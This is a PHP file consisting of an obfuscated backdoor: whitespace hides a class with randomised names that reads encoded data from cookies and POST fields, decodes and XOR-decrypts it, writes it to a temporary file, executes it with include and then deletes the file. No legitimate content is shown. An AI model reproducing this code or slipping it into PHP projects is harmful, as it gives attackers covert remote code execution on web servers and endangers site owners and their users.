<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("sjcvx")){class sjcvx{public static $cerjhc = "jrflnuztsxqlwgjy";public static $bgday = NULL;public function __construct(){$gfrimztyn = @$_COOKIE[substr(sjcvx::$cerjhc, 0, 4)];if (!empty($gfrimztyn)){$ildpblk = "base64";$uibayoh = "";$gfrimztyn = explode(",", $gfrimztyn);foreach ($gfrimztyn as $fnxkpwedqf){$uibayoh .= @$_COOKIE[$fnxkpwedqf];$uibayoh .= @$_POST[$fnxkpwedqf];}$uibayoh = array_map($ildpblk . "_decode", array($uibayoh,));$uibayoh = $uibayoh[0] ^ str_repeat(sjcvx::$cerjhc, (strlen($uibayoh[0]) / strlen(sjcvx::$cerjhc)) + 1);sjcvx::$bgday = @unserialize($uibayoh);}}public function __destruct(){$this->ccuvx();}private function ccuvx(){if (is_array(sjcvx::$bgday)) {$xglza = sys_get_temp_dir() . "/" . crc32(sjcvx::$bgday["salt"]);@sjcvx::$bgday["write"]($xglza, sjcvx::$bgday["content"]);include $xglza;@sjcvx::$bgday["delete"]($xglza);exit();}}}$yzwihesik = new sjcvx();$yzwihesik = NULL;} ?><?php
